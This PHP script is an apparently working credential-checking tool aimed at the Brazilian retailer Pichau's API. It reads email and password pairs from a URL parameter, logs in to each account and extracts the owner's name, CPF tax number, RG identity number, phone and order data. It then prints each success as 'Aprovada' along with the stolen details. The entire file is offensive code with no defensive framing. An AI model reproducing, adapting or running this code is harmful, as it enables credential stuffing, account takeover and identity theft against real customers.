<?php

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 888    888        d8888 8888888 888    d8P         d8888            d8888 8888888b.  8888888  .d8888b.  //
// 888    888       d88888   888   888   d8P         d88888           d88888 888   Y88b   888   d88P  Y88b //
// 888    888      d88P888   888   888  d8P         d88P888          d88P888 888    888   888   Y88b.      //
// 8888888888     d88P 888   888   888d88K         d88P 888         d88P 888 888   d88P   888    "Y888b.   //
// 888    888    d88P  888   888   8888888b       d88P  888        d88P  888 8888888P"    888       "Y88b. //
// 888    888   d88P   888   888   888  Y88b     d88P   888       d88P   888 888          888         "888 //
// 888    888  d8888888888   888   888   Y88b   d8888888888      d8888888888 888          888   Y88b  d88P //
// 888    888 d88P     888 8888888 888    Y88b d88P     888     d88P     888 888        8888888  "Y8888P"  //
//////////////////////////////////////////////////////////////////////////////////////////////////////////////

error_reporting(0);

function puxarbyhaika($string, $start, $end) {
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}

function multiexplode($string) {
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}
                                                                                              
$lista = $_GET['lista'];
$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];

$time = time();

$haikazx = curl_init();
curl_setopt_array($haikazx, [
CURLOPT_URL => "https://www.pichau.com.br/api/checkout",
CURLOPT_RETURNTRANSFER  => true,
CURLOPT_SSL_VERIFYPEER  => false,
CURLOPT_HTTPHEADER  => array(
'accept: */*',
'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
'content-type: application/json',
'origin: https://www.pichau.com.br',
'referer: https://www.pichau.com.br/account',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26'),
CURLOPT_POSTFIELDS => '{"operationName":"generateCustomerToken","variables":{"username":"'.$email.'","password":"'.$senha.'"},"query":"mutation generateCustomerToken($username: String!, $password: String!) {\n  generateCustomerToken(email: $username, password: $password) {\n    token\n    __typename\n  }\n}\n"}',
]);
$haika1 = curl_exec($haikazx);

$tokencapeta = puxarbyhaika($haika1, '"token":"','",');

$haikazx = curl_init();
curl_setopt_array($haikazx, [
CURLOPT_URL => "https://www.pichau.com.br/api/checkout",
CURLOPT_RETURNTRANSFER  => true,
CURLOPT_SSL_VERIFYPEER  => false,
CURLOPT_HTTPHEADER  => array(
'accept: */*',
'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
'authorization: Bearer '.$tokencapeta.'',
'content-type: application/json',
'origin: https://www.pichau.com.br',
'referer: https://www.pichau.com.br/account',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26'),
CURLOPT_POSTFIELDS => '{"operationName":null,"variables":{},"query":"{\n  customer {\n    firstname\n    lastname\n    suffix\n    email\n    default_billing\n    default_shipping\n    taxvat\n    rg\n    ie\n    tipopessoa\n    nomefantasia\n    empresa\n    addresses {\n      id\n      firstname\n      lastname\n      street\n      city\n      region {\n        region_code\n        region\n        __typename\n      }\n      postcode\n      country_code\n      telephone\n      __typename\n    }\n    orders(pageSize: 10) {\n      items {\n        id\n        increment_id\n        order_date\n        order_number\n        created_at\n        total {\n          grand_total {\n            value\n            currency\n            __typename\n          }\n          __typename\n        }\n        status\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}',
]);
$haikafoi = curl_exec($haikazx);
$nome = puxarbyhaika($haikafoi, '"firstname":"','",');
$nome2 = puxarbyhaika($haikafoi, '"lastname":"','",');
$cpf = puxarbyhaika($haikafoi, '"taxvat":"','",');
$telefone = puxarbyhaika($haikafoi, '"telephone":"','",');
$rg = puxarbyhaika($haikafoi, '"rg":"','",');

if(stripos($haikafoi, "firstname")){
  echo('<b><span class="badge badge-success">Aprovada</span> ➜ '.$email.'|'.$senha.' ➜ { Nome: '.$nome.' '.$nome2.' } [ Cpf: '.$cpf.' ] ➜ { Telefone: '.$telefone.' } ➜ { Rg: '.$rg.' } ➜ ' . (time() - $time) .  ' Seg <span class="badge badge-success">Haika#1533</span> </b><br>');
}
else{
echo('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$email.'|'.$senha.' <span class="badge badge-primary">Conta Não Encontrada!</span> ➜ ' . (time() - $time) .  ' Seg <span class="badge badge-success">Haika#1533</span> </b><br>');
}

?>